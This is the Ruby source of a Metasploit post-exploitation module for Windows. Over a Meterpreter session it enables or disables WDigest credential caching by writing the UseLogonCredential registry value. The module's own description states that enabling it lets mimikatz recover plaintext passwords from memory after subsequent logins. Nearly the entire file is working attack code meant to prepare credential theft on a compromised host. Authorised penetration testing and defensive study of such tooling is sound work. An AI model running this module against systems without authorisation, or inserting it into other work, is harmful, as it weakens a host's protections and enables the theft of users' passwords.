##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Version

  WDIGEST_REG_LOCATION = 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest'.freeze
  USE_LOGON_CREDENTIAL = 'UseLogonCredential'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Post Manage WDigest Credential Caching',
        'Description' => %q{
          On Windows 8/2012 or higher, the Digest Security Provider (WDIGEST) is disabled by default. This module enables/disables
          credential caching by adding/changing the value of the UseLogonCredential DWORD under the WDIGEST provider's Registry key.
          Any subsequent logins will allow mimikatz to recover the plain text passwords from the system's memory.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('ENABLE', [false, 'Enable the WDigest Credential Cache.', true])
      ]
    )
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    # Check if OS is 8/2012 or newer. If not, no need to set the registry key
    # Can be backported to Windows 7, 2k8R2 but defaults to enabled...
    version = get_version_info
    if version.build_number < Msf::WindowsVersion::Win7_SP0
      print_status('Older Windows version detected. No need to enable the WDigest Security Provider. Exiting...')
    else
      datastore['ENABLE'] ? wdigest_enable : wdigest_disable
    end
  end

  def get_key
    # Check if the key exists. Not present by default
    print_status("Checking if the #{WDIGEST_REG_LOCATION}\\#{USE_LOGON_CREDENTIAL} DWORD exists...")
    wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)
    key_exists = !wdvalue.nil?

    print_status("#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}") if key_exists
    return wdvalue
  rescue Rex::Post::Meterpreter::RequestError => e
    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
  end

  def wdigest_enable
    wdvalue = get_key
    key_exists = !wdvalue.nil?

    # If it is not present, create it
    if wdvalue == 1
      print_good('Registry value is already set. WDigest Security Provider is enabled')
      return
    end

    verb = key_exists ? 'Setting' : 'Creating'
    print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...")
    if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')
      print_good('WDigest Security Provider enabled')
    else
      print_error('Unable to access registry key - insufficient privileges?')
    end
  rescue Rex::Post::Meterpreter::RequestError => e
    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
  end

  def wdigest_disable
    wdvalue = get_key
    key_exists = !wdvalue.nil?

    # If it is not present, create it
    if wdvalue == 0
      print_good('Registry value is already set. WDigest Security Provider is disabled')
      return
    end

    verb = key_exists ? 'Setting' : 'Creating'
    print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 0...")
    if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 0, 'REG_DWORD')
      print_good('WDigest Security Provider disabled')
    else
      print_error('Unable to access registry key - insufficient privileges?')
    end
  rescue Rex::Post::Meterpreter::RequestError => e
    fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
  end
end
